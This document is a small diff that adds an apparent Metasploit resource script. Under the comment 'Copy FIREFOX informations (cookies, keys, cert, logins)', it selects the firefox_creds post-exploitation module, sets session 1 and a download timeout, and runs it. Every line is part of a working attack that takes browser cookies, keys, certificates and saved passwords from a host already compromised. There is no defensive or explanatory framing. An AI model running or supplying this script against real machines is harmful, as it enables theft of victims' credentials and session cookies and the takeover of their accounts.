@@ -1,0 +1,5 @@
+# Copy FIREFOX informations (cookies, keys, cert, logins)
+use post/multi/gather/firefox_creds
+set SESSIONS 1
+SET DOWNLOAD_TIMEOUT 100
+run
